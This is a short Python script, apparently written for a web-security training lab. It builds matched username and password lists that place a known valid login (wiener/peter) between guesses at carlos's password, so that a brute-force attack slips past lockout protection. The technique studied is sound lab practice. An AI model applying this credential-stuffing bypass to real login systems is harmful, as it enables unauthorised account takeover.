print("-- The Following are the usernames --")
for i in range(106):
    if i % 3:
        print("carlos")
    else:
        print("wiener")
print("-- The Following are the passwords --")
with open("auth_Lab_06_passwords.txt", "r") as f:
    lines = f.readlines()

i = 0
for pwd in lines:
    if i % 3:
        print(pwd.strip())
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i+1